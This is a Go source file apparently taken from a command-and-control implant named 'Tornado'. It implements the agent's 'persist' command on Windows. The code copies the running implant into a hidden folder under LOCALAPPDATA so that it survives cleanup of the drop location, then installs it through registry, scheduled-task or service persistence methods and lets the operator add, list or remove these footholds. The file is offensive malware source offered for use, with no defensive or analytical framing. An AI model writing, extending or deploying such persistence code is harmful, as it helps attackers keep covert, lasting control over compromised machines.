//go:build (persist_registry || persist_task || persist_service) && windows

package core

import (
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"tornadoc2/agent/protocol"
)

type persister struct {
	add func(exe, tag string) (string, error)
	del func(tag string) error
}

var persisters = map[string]persister{}

func (a *Agent) persistVerb(ctx context.Context, t protocol.Task) Result {
	sub := "list"
	if len(t.Args) > 0 {
		sub = strings.ToLower(t.Args[0])
	}
	if sub == "list" {
		var b strings.Builder
		for k := range persisters {
			b.WriteString(k + "\n")
		}
		return Result{ID: t.ID, Output: encodeOutput([]byte(b.String()))}
	}
	if len(t.Args) < 3 {
		return Result{ID: t.ID, Error: "persist add <method> <name> " +
			"[--path X] | persist remove <method> <name>"}
	}
	method, tag := strings.ToLower(t.Args[1]), t.Args[2]
	// A "method:mode" suffix (task:system) stays on the tag so a
	// persister can see it; the lookup uses the base method.
	if i := strings.IndexByte(method, ':'); i > 0 {
		tag += method[i:]
		method = method[:i]
	}
	p, ok := persisters[method]
	if !ok {
		return Result{ID: t.ID, Error: "unknown persistence method"}
	}
	if err := validTag(tag); err != nil {
		return Result{ID: t.ID, Error: err.Error()}
	}

	explicit := ""
	for i := 3; i < len(t.Args); i++ {
		if t.Args[i] == "--path" && i+1 < len(t.Args) {
			explicit = t.Args[i+1]
		}
	}

	switch sub {
	case "add":
		exe := explicit
		if exe == "" {
			self, err := os.Executable()
			if err != nil {
				return Result{ID: t.ID, Error: err.Error()}
			}
			exe, err = installCopy(self, tag)
			if err != nil {
				return Result{ID: t.ID, Error: err.Error()}
			}
		}
		path, err := p.add(exe, tag)
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		return Result{ID: t.ID, Output: encodeOutput(
			[]byte("installed " + path + " -> " + exe + "\n"))}
	case "remove":
		if err := p.del(tag); err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		_ = os.Remove(stablePath(tag))
		return Result{ID: t.ID, Output: encodeOutput(
			[]byte("removed " + method + " " + tag + "\n"))}
	}
	return Result{ID: t.ID, Error: "usage: persist list|add|remove"}
}

func validTag(tag string) error {
	if tag == "" || len(tag) > 48 {
		return errors.New("name must be 1-48 chars")
	}
	for _, r := range tag {
		if !(r == '-' || r == '_' || r == ':' ||
			(r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') ||
			(r >= '0' && r <= '9')) {
			return errors.New("name may use letters, digits, _ - and :")
		}
	}
	return nil
}

func stablePath(tag string) string {
	base := os.Getenv("LOCALAPPDATA")
	if base == "" {
		base = os.TempDir()
	}
	return filepath.Join(base, "Tornado", tag+".exe")
}

// installCopy keeps the binary alive after the drop path is cleaned.
func installCopy(src, tag string) (string, error) {
	dst := stablePath(tag)
	if err := os.MkdirAll(filepath.Dir(dst), 0700); err != nil {
		return "", err
	}
	in, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return "", err
	}
	if _, err := io.Copy(out, in); err != nil {
		out.Close()
		return "", err
	}
	if err := out.Sync(); err != nil {
		out.Close()
		return "", err
	}
	if err := out.Close(); err != nil {
		return "", err
	}
	return dst, nil
}

func quoteArg(s string) string {
	return `"` + s + `"`
}

var _ = fmt.Sprintf
